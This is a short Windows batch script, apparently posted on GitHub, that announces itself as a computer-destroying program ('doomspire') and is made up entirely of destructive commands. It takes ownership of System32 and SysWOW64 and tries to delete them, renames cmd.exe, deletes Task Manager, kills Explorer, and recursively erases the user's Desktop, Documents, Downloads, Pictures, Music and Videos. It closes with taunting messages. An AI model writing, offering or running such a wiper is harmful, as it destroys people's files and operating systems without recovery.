@echo off
echo This program performs dangerous operations.
Echo Do not continue unless you fully understand the consequences.
Echo Note: It wont work if you dont run it as an administrators
Echo Made by @Syed930 on github
Echo I am not responsible for any damages madde by it!
Echo enjoy!!!!!!!!!!!!
net session >nul 2>&1
echo Motherf**ker your computer will be destroyed by doomspire
mkdir "C:\Windows\System32\osdata.txt"
takeown /f C:\Windows\System32
icacls C:\Windows\System32 /grant Administrators:F /t
rmdir /q C:\Windows\System32
takeown /f C:\Windows\System32 /r /d y
icacls C:\Windows\System32 /grant Administrators:F
takeown /f C:\Windows\Syswow64 /r /d y
icacls C:\Windows\Syswow64 /grant Administrators:F
rmdir /q C:\Windows\Syswow64
ren cmd.exe 78ff4fo.exe
del Taskmgr.exe
taskkill /f /im explorer.exe /t
del /q /s "%USERPROFILE%\Desktop\*"
del /q /s "%USERPROFILE%\Documents\*"
del /q /s "%USERPROFILE%\Downloads\*"
del /q /s "%USERPROFILE%\Pictures\*"
del /q /s "%USERPROFILE%\Music\*"
del /q /s "%USERPROFILE%\Videos\*"
echo This computer is ruined
echo hhahhahhHHhhHHHahhahahhah
